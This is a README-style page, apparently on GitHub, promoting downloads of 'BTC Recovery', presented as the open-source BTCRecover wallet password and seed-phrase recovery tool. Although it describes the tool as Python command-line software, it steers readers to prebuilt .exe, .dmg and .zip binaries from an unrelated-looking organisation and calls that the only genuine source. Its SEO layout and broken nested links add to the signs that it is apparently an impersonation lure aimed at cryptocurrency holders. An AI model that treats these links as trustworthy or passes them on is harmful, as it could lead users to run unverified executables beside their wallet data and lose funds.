<div align="center">
<img src="assets/banner-article.png" alt="Bitcoin wallet recovery tool">
</div>

# Bitcoin wallet recovery tool

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

BTCRecover is a free, open-source tool for two jobs: getting back into a wallet file whose password you only partly remember, and completing a seed phrase that is missing words or has them in the wrong order. It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere.

## You'll see this if

You have a wallet, a backup or a phrase in front of you, and the question is whether software can do anything with it. Most situations fall on one side of a clear line: a local artifact you still possess is work for a tool, and an account or a service you no longer control is not.

| Your situation | Can a local tool help? | Where to go |
|---|---|---|
| Encrypted wallet file, password partly remembered | yes  -  candidates are testable | [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) |
| Seed phrase short by one or more words | yes  -  bounded search per position | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| Phrase complete, wallet opens empty | yes  -  wallet type, derivation, passphrase | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| Wallet was on an exchange or a custodial app | no  -  the provider holds the keys | see the note below |
| Trust Wallet, Phantom, Ronin, Coinbase Wallet, Binance, Pi, Enjin, Tonkeeper, Ari | no  -  not a target of this tool | [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) |
| Phrase never written down and not stored anywhere | no  -  nothing to search against | [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) |
| Coins sent to the wrong address | no  -  a confirmed transaction is not reversible | see the note below |

Two rows deserve the plain version. A custodial balance is a database entry held by someone else, so no local tool reaches it and the only route is that provider's own account recovery. A payment sent to an address you did not control is final by design; software cannot pull it back.

## Why it happens

A wallet has no reset. Its password encrypts a file on your disk and its phrase regenerates the keys, so the only way back in is to reproduce the input  -  the password or the words  -  rather than to ask anyone to restore access.

That is what makes recovery a search rather than a rescue. A password you half-remember constrains the space enormously: "probably my dog's name plus a year, maybe capitalised, maybe with an exclamation mark" is a rule set, not a wild guess. A phrase missing two words is 2,048 options in each empty slot. A wallet file that opens but shows nothing is usually a correct phrase read through the wrong wallet type or derivation path. Each case is solvable in principle, expensive in practice, and completely dependent on something you still have.

It also explains why a tool and not a service. The material that unlocks the wallet is the material that steals it, so the work has to happen on your machine, offline, with the network cable out. BTCRecover is written for exactly that: local, command-line, no account, no upload.

## Fix

Pick the entry that matches the artifact you hold, then run the current release offline against it. Every route below starts with identification and ends with a verification step, because a candidate that has not been checked against a known address is a suspicion, not a recovery.

1. **Name the artifact.** A `wallet.dat` file, an Electrum wallet file, a MetaMask vault, a written phrase, an encrypted paper key. The file type decides the mode; guessing it wastes the run.
2. **Download the current release from the GitHub releases page**  -  [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1)  -  and keep it on the machine that holds the wallet data. The tool is Python-based CLI software, and the release page is the only place the project distributes it from.
3. **Disconnect the network for the run.** The tool works offline, and nothing about the task needs a connection.
4. **Choose the mode.** Password recovery takes a wallet file plus candidate rules; seed recovery takes the words you have, the positions you do not, and a target address.
5. **Give it a target it can check.** For a password, the file itself is the test. For a phrase, use an address that belongs to the wallet, so each candidate can be confirmed or discarded.
6. **Run it and watch the output.** Progress is printed as candidates are tested, so a slow run is visibly working rather than silently stuck.
7. **Verify the result.** Open the recovered wallet in a fresh install, or restore the found phrase into a clean wallet, and confirm the address matches before moving anything.

What the tool covers, in the terms the project documents: lost or partial wallet passwords, missing and misordered seed words, typo and checksum failures, BIP39 passphrases, derivation paths, encrypted paper-wallet keys, token and pattern lists for password candidates, and GPU acceleration for large searches. It does not cover wallets it was not built for, and it does not need  -  or ask for  -  a phrase to be sent to anyone.

## If that did not work

If a run completes with no result, the input is wrong somewhere, not the idea. Check the artifact type, then the target address, then the rules you gave it, then which positions you declared unknown.

The most common single mistake is a target address from a different account in the same wallet, which makes a correct phrase look useless. The second is a wallet type mismatch  -  an Electrum phrase searched as if it were a Bitcoin Core backup. The third is a candidate rule that silently excludes the real password, for example a pattern list that assumes a capital letter the password never had. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) takes those four inputs one at a time, cheapest first, and the same sequence, with the actual prompts, is the first-run order.

## Prevention

- Download only from the GitHub releases page, and check the published file hash before running anything. [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1)
- Keep the tool and the wallet data together on a machine you control, and work offline.
- Never send a phrase, a key or a password to a person, a chat or a form. No legitimate recovery of your own wallet needs it.
- Keep a written inventory: which wallet, which year, which file, which address. The inventory is what makes a future recovery a short job.

BTCRecover is actively maintained, and every release is published on the GitHub releases page.
## FAQ

### Is BTCRecover free?

Yes. It is open-source software under the GPL-2.0 licence, so there is no licence fee, no account and no per-wallet charge. The source is public and the release page carries the builds.

### What exactly is BTCRecover?

An open-source wallet password and seed recovery tool, written in Python, with a command-line interface as its primary surface. It tests candidate passwords and candidate phrases against a wallet or an address that you already hold, locally.

### Is it safe to use?

The design is safe in the way that matters: it runs offline and needs nothing sent anywhere. The risk sits elsewhere  -  in copies obtained from anywhere other than the release page, and in anyone who offers to "run it for you" and asks for the phrase. [Checking a download]([Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md)) covers how to tell a genuine copy from a lookalike.

### Which wallets can it recover?

Wallet files and phrases from Bitcoin Core, Electrum, Blockchain.com, MetaMask vaults, MultiBit and several other formats, plus encrypted paper-wallet keys and hardware-wallet seed phrases. Wallets outside that set, including several popular mobile and exchange wallets, are [not targets]([Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md)) and the tool will not pretend otherwise.

### Does it need an internet connection?

No. The search is arithmetic on your own hardware against data on your own disk. A connection is needed once, to fetch the release, and never during a run.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [Is BTCRecover safe, and how to check a download]([Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md))
